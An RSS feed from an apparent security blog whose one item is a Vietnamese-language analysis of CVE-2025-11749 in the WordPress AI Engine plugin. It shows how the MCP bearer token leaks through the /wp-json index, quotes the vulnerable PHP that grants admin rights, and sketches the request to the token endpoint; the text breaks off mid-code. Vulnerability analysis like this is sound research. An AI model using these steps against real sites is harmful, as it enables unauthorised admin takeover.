<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>T·∫•t C·∫£ B√†i Vi·∫øt - Bui Van Y</title>
    <link>http://localhost:1313/vi/posts/</link>
    <description>Bui Van Y</description>
    <generator>Hugo 0.153.2 &amp; FixIt v0.4.0-alpha.3-20251225101113-8ffb9a95</generator>
    <language>vi</language>
    <managingEditor>w41bu1@gmail.com (Bui Van Y)</managingEditor>
    <webMaster>w41bu1@gmail.com (Bui Van Y)</webMaster>
    <lastBuildDate>Thu, 01 Jan 2026 00:29:46 +0700</lastBuildDate>
    <atom:link href="http://localhost:1313/vi/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2025-11749 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</link>
      <pubDate>Thu, 01 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin AI Engine cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;l·ªô th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;3.1.3&lt;/strong&gt;, th√¥ng qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. L·ªó h·ªïng n√†y l√†m l·ªô &lt;strong&gt;Bearer Token&lt;/strong&gt; khi t√πy ch·ªçn &lt;strong&gt;‚ÄúNo-Auth URL‚Äù&lt;/strong&gt; ƒë∆∞·ª£c b·∫≠t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; l·∫•y ƒë∆∞·ª£c bearer token, t·ª´ ƒë√≥ c√≥ th·ªÉ truy c·∫≠p v√†o m·ªôt phi√™n l√†m vi·ªác h·ª£p l·ªá v√† th·ª±c hi·ªán nhi·ªÅu h√†nh ƒë·ªông nh∆∞ &lt;strong&gt;t·∫°o t√†i kho·∫£n qu·∫£n tr·ªã vi√™n m·ªõi&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-11749&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-11749&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.1.3&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.1.4&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ai-engine/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress AI Engine Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;AI Engine&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.3&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.1.4&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω API:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function rest_api_init() {&#xA;    // Load bearer token if not already loaded&#xA;    if ( $this-&amp;gt;bearer_token === null ) {&#xA;      $this-&amp;gt;bearer_token = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_bearer_token&amp;#39; );&#xA;    }&#xA;    ...&#xA;    // No-Auth URL endpoints (with token in path)&#xA;    $noauth_enabled = $this-&amp;gt;core-&amp;gt;get_option( &amp;#39;mcp_noauth_url&amp;#39; );&#xA;    if ( $noauth_enabled &amp;amp;&amp;amp; !empty( $this-&amp;gt;bearer_token ) ) {&#xA;        ...&#xA;        register_rest_route( $this-&amp;gt;namespace, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/messages&amp;#39;, [&#xA;            &amp;#39;methods&amp;#39; =&amp;gt; &amp;#39;POST&amp;#39;,&#xA;            &amp;#39;callback&amp;#39; =&amp;gt; [ $this, &amp;#39;handle_message&amp;#39; ],&#xA;            &amp;#39;permission_callback&amp;#39; =&amp;gt; function ( $request ) {&#xA;                return $this-&amp;gt;handle_noauth_access( $request );&#xA;            },&#xA;        ] );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ƒêi·ªÅu ki·ªán ƒë·ªÉ c√°c API n√†y ho·∫°t ƒë·ªông l√†:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Bearer Token&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c thi·∫øt l·∫≠p (ƒë√£ t·ªìn t·∫°i gi√° tr·ªã).&lt;/li&gt;&#xA;&lt;li&gt;T√πy ch·ªçn &lt;strong&gt;No-Auth URL&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c b·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Ta c√≥ th·ªÉ ho√†n th√†nh c√°c thi·∫øt l·∫≠p n√†y trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;) theo th·ª© t·ª± nh∆∞ sau:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#34; title=&#34;Setup Bearer Token v√† No-Auth URL&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable&lt;/h2&gt;&lt;p&gt;Setup Bearer Token v√† No-Auth URL&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable.png&#39; alt=&#34;Enable&#34; height=&#34;472&#34; width=&#34;868&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Setup Bearer Token v√† No-Auth URL&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta ƒë·∫∑t &lt;strong&gt;Bearer Token&lt;/strong&gt; th√†nh 1 chu·ªói b·∫•t k√¨, v√≠ d·ª•: &lt;code&gt;aaaaaaaaaa&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Chu·ªói n√†y ƒë√≥ng vai tr√≤ nh∆∞ &lt;strong&gt;ch√¨a kh√≥a b√≠ m·∫≠t ƒë·ªÉ&lt;/strong&gt; truy c·∫≠p c√°c API n√†y.&#xA;Ch·ªâ nh·ªØng ai bi·∫øt gi√° tr·ªã n√†y m·ªõi c√≥ th·ªÉ g·ªçi ƒë∆∞·ª£c c√°c endpoint t∆∞∆°ng ·ª©ng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, theo m√¥ t·∫£ c·ªßa CVE th√¨ ƒë√¢y l√† 1 ph·∫ßn c·ªßa l·ªó h·ªïng, ngay c·∫£ ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p c≈©ng c√≥ bi·∫øt gi√° tr·ªã c·ªßa &lt;strong&gt;Bearer Token&lt;/strong&gt; =&amp;gt; kh√¥ng c√≤n l√† &lt;strong&gt;b√≠ m·∫≠t&lt;/strong&gt; n·ªØa.&lt;/p&gt;&#xA;&lt;p&gt;M·ªçi th·ª© ƒë∆∞·ª£c &lt;strong&gt;b·∫≠t m√≠&lt;/strong&gt; khi ta truy c·∫≠p &lt;code&gt;/wp-json&lt;/code&gt;, WordPress s·∫Ω tr·∫£ v·ªÅ &lt;strong&gt;REST API Index&lt;/strong&gt; ‚Äî t·ª©c l√† b·∫£n m√¥ t·∫£ to√†n b·ªô c√°c API m√† website ƒëang cung c·∫•p, bao g·ªìm c√°c API ch·ª©a &lt;strong&gt;Bearer Token&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#34; title=&#34;Gi√° tr·ªã Bearer Token trong response&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/exposed.png&#34; data-sub-html=&#34;&lt;h2&gt;Exposed&lt;/h2&gt;&lt;p&gt;Gi√° tr·ªã Bearer Token trong response&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/exposed.png&#39; alt=&#34;Exposed&#34; height=&#34;877&#34; width=&#34;1570&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Gi√° tr·ªã Bearer Token trong response&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;T·∫•t c·∫£ ng∆∞·ªùi d√πng (k·ªÉ c·∫£ &lt;strong&gt;ch∆∞a ƒëƒÉng nh·∫≠p&lt;/strong&gt;) ƒë·ªÅu c√≥ th·ªÉ g·ªçi ƒë·∫øn &lt;code&gt;/wp-json&lt;/code&gt; n√†y.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;v3.1.4&lt;/strong&gt; th√™m t√πy ch·ªçn &lt;code&gt;&#39;show_in_rest&#39; =&amp;gt; false&lt;/code&gt; khi ƒëƒÉng k√Ω API, nh·∫±m &lt;strong&gt;·∫©n c√°c endpoint kh·ªèi &lt;code&gt;/wp-json&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#34; title=&#34;B·∫£n v√°&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;B·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/patch.png&#39; alt=&#34;Patch&#34; height=&#34;601&#34; width=&#34;1770&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y gi√∫p:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng hi·ªÉn th·ªã API trong danh s√°ch REST&lt;/li&gt;&#xA;&lt;li&gt;Gi·∫£m kh·∫£ nƒÉng b·ªã d√≤ qu√©t&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Tuy nhi√™n:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;API v·∫´n truy c·∫≠p ƒë∆∞·ª£c n·∫øu bi·∫øt URL&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng thay th·∫ø cho c∆° ch·∫ø x√°c th·ª±c an to√†n&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;üëâ ƒê√¢y ch·ªâ l√† bi·ªán ph√°p che gi·∫•u, kh√¥ng ph·∫£i b·∫£o m·∫≠t th·ª±c s·ª±.&lt;/p&gt;&#xA;&lt;p&gt;API ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω v·ªõi &lt;code&gt;permission_callback&lt;/code&gt; l√† &lt;code&gt;handle_noauth_access&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_noauth_access( $request ) {&#xA;    // For no-auth URLs, the token is already verified by being in the URL path&#xA;    // Double-check that the route actually contains the token&#xA;    $route = $request-&amp;gt;get_route();&#xA;    if ( strpos( $route, &amp;#39;/&amp;#39; . $this-&amp;gt;bearer_token . &amp;#39;/&amp;#39; ) === false ) {&#xA;      if ( $this-&amp;gt;logging ) {&#xA;        error_log( &amp;#39;[AI Engine MCP] ‚ùå Invalid no-auth URL access attempt.&amp;#39; );&#xA;      }&#xA;      return false;&#xA;    }&#xA;&#xA;    // Set the current user to admin since token is valid&#xA;    if ( $admin = $this-&amp;gt;core-&amp;gt;get_admin_user() ) {&#xA;      wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&#xA;    }&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra &lt;strong&gt;Bearer Token&lt;/strong&gt; c√≥ h·ª£p l·ªá hay kh√¥ng. N·∫øu h·ª£p l·ªá, h√†m s·∫Ω:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wp_set_current_user( $admin-&amp;gt;ID, $admin-&amp;gt;user_login );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G√°n ng∆∞·ªùi d√πng hi·ªán t·∫°i th√†nh admin, cho ph√©p &lt;code&gt;&amp;quot;request hi·ªán t·∫°i&amp;quot;&lt;/code&gt; ti·∫øp t·ª•c th·ª±c thi v·ªõi to√†n quy·ªÅn qu·∫£n tr·ªã. Sau khi request k·∫øt th√∫c th√¨ quy·ªÅn admin c≈©ng h·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;Khi ta truy c·∫≠p endpoint &lt;code&gt;/wp-json/mcp/v1/aaaaaaaaaa/messages&lt;/code&gt; th√¨ callback &lt;code&gt;handle_message&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_message( WP_REST_Request $request ) {&#xA;    ...&#xA;    $raw = $request-&amp;gt;get_body();&#xA;    $dat = json_decode( $raw, true );&#xA;    ...&#xA;    $id = $dat[&amp;#39;id&amp;#39;] ?? null;&#xA;    $method = $dat[&amp;#39;method&amp;#39;] ?? null;&#xA;    ...&#xA;    // It&amp;#39;s a notification, no ID = no reply&#xA;    if ( $id === null &amp;amp;&amp;amp; $method !== null ) {&#xA;      return new WP_REST_Response( null, 204 );&#xA;    }&#xA;    ...&#xA;    try {&#xA;&#xA;      $reply = null;&#xA;&#xA;      #region Methods switch&#xA;      switch ( $method ) {&#xA;        ...&#xA;        case &amp;#39;tools/call&amp;#39;:&#xA;          $params = $dat[&amp;#39;params&amp;#39;] ?? [];&#xA;          $tool = $params[&amp;#39;name&amp;#39;] ?? &amp;#39;&amp;#39;;&#xA;          $arguments = $params[&amp;#39;arguments&amp;#39;] ?? [];&#xA;&#xA;          if ( $this-&amp;gt;logging ) {&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] üîß tools/call - Tool: &amp;#39; . $tool );&#xA;            error_log( &amp;#39;[AI Engine MCP SSE] üîß tools/call - Arguments: &amp;#39; . wp_json_encode( $arguments ) );&#xA;          }&#xA;&#xA;          try {&#xA;            $reply = $this-&amp;gt;execute_tool( $tool, $arguments, $id );&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ‚úÖ tools/call - Success for tool: &amp;#39; . $tool );&#xA;            }&#xA;          }&#xA;          catch ( Exception $e ) {&#xA;            if ( $this-&amp;gt;logging ) {&#xA;              error_log( &amp;#39;[AI Engine MCP SSE] ‚ùå tools/call - Error: &amp;#39; . $e-&amp;gt;getMessage() );&#xA;            }&#xA;            throw $e;&#xA;          }&#xA;          break;&#xA;        ...&#xA;      }&#xA;      #endregion&#xA;&#xA;      if ( $reply ) {&#xA;        // Don&amp;#39;t log response queuing - it&amp;#39;s too noisy&#xA;        $this-&amp;gt;store_message( $sess, $reply );&#xA;      }&#xA;&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      $this-&amp;gt;queue_error( $sess, $id, -32603, &amp;#39;Internal error&amp;#39;, $e-&amp;gt;getMessage() );&#xA;    }&#xA;&#xA;    return new WP_REST_Response( null, 204 );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m nh·∫≠n m·ªôt request JSON, ph√¢n t√≠ch n·ªôi dung, th·ª±c thi h√†nh ƒë·ªông t∆∞∆°ng ·ª©ng v√† tr·∫£ k·∫øt qu·∫£ (n·∫øu c·∫ßn).&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;N·∫øu l√† notification (kh√¥ng c√≥ &lt;code&gt;id&lt;/code&gt;) ‚Üí Kh√¥ng c·∫ßn ph·∫£n h·ªìi ‚Üí tr·∫£ HTTP 204&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($id === null &amp;amp;&amp;amp; $method !== null)&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;X·ª≠ l√Ω theo method: N·∫øu l√† &lt;code&gt;tools/call&lt;/code&gt; th√¨ l·∫•y c√°c param c·∫ßn thi·∫øt v√† g·ªçi ƒë·∫øn &lt;code&gt;execute_tool( $tool, $arguments, $id );&lt;/code&gt; ƒë·ªÉ th·ª±c thi tool n·ªôi b·ªô.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Request body hi·ªán t·∫°i s·∫Ω nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&#xA;  &amp;#34;id&amp;#34;: 1,&#xA;  &amp;#34;method&amp;#34;: &amp;#34;tools/call&amp;#34;,&#xA;  &amp;#34;params&amp;#34;: {&#xA;  },&#xA;  &amp;#34;name&amp;#34;: &amp;#34;2&amp;#34;,&#xA;  &amp;#34;arguments&amp;#34;: &amp;#34;3&amp;#34;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;private function execute_tool( $tool, $args, $id ) {&#xA;    try {&#xA;      ...&#xA;      $filtered = apply_filters( &amp;#39;mwai_mcp_callback&amp;#39;, null, $tool, $args, $id, $this );&#xA;      ...&#xA;    }&#xA;    catch ( Exception $e ) {&#xA;      return $this-&amp;gt;rpc_error( $id, -32603, $e-&amp;gt;getMessage() );&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;execute_tool&lt;/code&gt; g·ªçi ƒë·∫øn c√°c callback ƒë√£ ƒëƒÉng k√Ω cho filter &lt;code&gt;mwai_mcp_callback&lt;/code&gt; c√πng 3 tham s·ªë ƒë√£ truy·ªÅn v√†o tr∆∞·ªõc ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;Khi search v·ªõi t·ª´ kh√≥a &lt;code&gt;mwai_mcp_callback&lt;/code&gt; ta th·∫•y n√≥ ƒë∆∞·ª£c ƒëƒÉng k√Ω trong class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt;, n∆°i ·∫£nh h∆∞·ªüng tr·ª±c ti·∫øp ƒë·∫øn l·ªó h·ªïng n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#34; title=&#34;Filter mwai_mcp_callback&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/filter.png&#34; data-sub-html=&#34;&lt;h2&gt;Filter&lt;/h2&gt;&lt;p&gt;Filter mwai_mcp_callback&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/filter.png&#39; alt=&#34;Filter&#34; height=&#34;422&#34; width=&#34;1740&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Filter mwai_mcp_callback&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu ki·ªán ƒë·ªÉ filter n√†y ho·∫°t ƒë·ªông l√† class &lt;code&gt;Meow_MWAI_Labs_MCP_Core&lt;/code&gt; ph·∫£i ƒë∆∞·ª£c kh·ªüi t·∫°o ·ªü ƒë√¢u ƒë√≥.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#34; title=&#34;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/init.png&#34; data-sub-html=&#34;&lt;h2&gt;Init&lt;/h2&gt;&lt;p&gt;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/init.png&#39; alt=&#34;Init&#34; height=&#34;669&#34; width=&#34;1133&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Meow_MWAI_Labs_MCP_Core ƒë∆∞·ª£c kh·ªüi t·∫°o&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒêi·ªÅu n√†y ch·ªâ x·∫£y ra khi MCP Features WordPress ƒë∆∞·ª£c b·∫≠t. Ta c√≥ th·ªÉ ho√†n th√†nh c√°c thi·∫øt l·∫≠p n√†y trong Admin Dashboard (Endpoint: &lt;code&gt;/wp-admin/admin.php?page=mwai_settings&amp;amp;nekoTab=settings&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#34; title=&#34;B·∫≠t MCP Features WordPress&#34; data-thumbnail=&#34;/posts/2026-01-01-cve-2025-11749/enable1.png&#34; data-sub-html=&#34;&lt;h2&gt;Enable1&lt;/h2&gt;&lt;p&gt;B·∫≠t MCP Features WordPress&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-01-cve-2025-11749/enable1.png&#39; alt=&#34;Enable1&#34; height=&#34;353&#34; width=&#34;851&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;B·∫≠t MCP Features WordPress&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi filter ƒë∆∞·ª£c √°p d·ª•ng, callback &lt;code&gt;handle_call&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_call( $prev, string $tool, array $args, int $id ) {&#xA;    // Security check is already done in the MCP auth layer&#xA;    // If we reach 